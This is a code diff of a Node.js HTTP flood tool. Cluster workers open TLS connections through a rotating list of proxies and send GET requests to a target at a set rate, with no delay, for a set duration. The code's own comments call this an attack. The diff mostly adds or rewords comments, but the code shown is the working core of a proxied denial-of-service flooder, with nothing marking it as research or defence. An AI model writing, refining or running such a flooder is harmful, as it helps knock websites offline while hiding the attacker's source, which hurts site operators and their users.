@@ -44,6 +44,7 @@ if (cluster.isMaster) {
     let proxyIndex = 0;
     const startTime = Date.now(); // Save the start time of the attack
 
+    // Function to send a single request using TLS connection
     function sendTLSRequest(proxy) {
         const proxyParts = proxy.trim().split(":");
         if (proxyParts.length < 2) return;
@@ -65,6 +66,7 @@ if (cluster.isMaster) {
                     process.exit(0);
                 }
 
+                // Flood request with the given rps
                 for (let i = 0; i < rps; i++) {
                     const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                     `Host: ${target.hostname}\r\n` +
@@ -73,7 +75,9 @@ if (cluster.isMaster) {
                                     "Connection: keep-alive\r\n\r\n";
                     client.write(request);
                 }
-                setTimeout(flood, 0); // Flooding with no delay for simultaneous requests
+
+                // Continue flooding without delay for high-speed request sending
+                setTimeout(flood, 0); // Flooding as quickly as possible within the given rps
             }
             flood();
         });
@@ -87,6 +91,7 @@ if (cluster.isMaster) {
         });
     }
 
+    // Main loop to handle proxy usage and flooding
     function attackLoop() {
         if (Date.now() - startTime >= duration * 1000) {
             console.log(`Worker ${process.pid} stopping attack.`);
@@ -97,7 +102,7 @@ if (cluster.isMaster) {
         proxyIndex = (proxyIndex + 1) % proxies.length; // Round-robin proxy
 
         sendTLSRequest(proxy);
-        setTimeout(attackLoop, 0); // Immediately continue attacking with the next proxy
+        setTimeout(attackLoop, 0); // Continue flooding without delay
     }
 
     // Add uncaught exception handler to prevent worker crashes
